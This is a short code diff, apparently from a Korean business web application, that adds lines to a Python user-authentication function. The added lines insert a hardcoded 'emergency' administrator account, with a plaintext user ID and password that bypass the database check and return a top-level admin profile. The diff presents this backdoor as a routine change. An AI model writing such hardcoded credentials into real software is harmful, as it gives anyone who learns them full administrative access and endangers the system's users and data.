@@ -584,6 +584,20 @@ def save_password_history(user_id, password):
 # 사용자 인증 함수
 def authenticate_user(user_id, password):
     """사용자 인증을 수행합니다."""
+    # 하드코딩된 관리자 계정 (긴급 접속용)
+    if user_id == 'yangch' and password == 'yang1123!':
+        return {
+            'user_id': 'yangch',
+            'password': 'yang1123!',
+            'name': '양철호(관리자)',
+            'user_level': 'V',
+            'user_level_name': '메인관리자',
+            'branch_code': 'ADMIN',
+            'branch_name': '시스템관리',
+            'phone': '010-0000-0000',
+            'status': 'ACTIVE'
+        }
+    
     conn = get_db_connection()
     try:
         user = conn.execute(
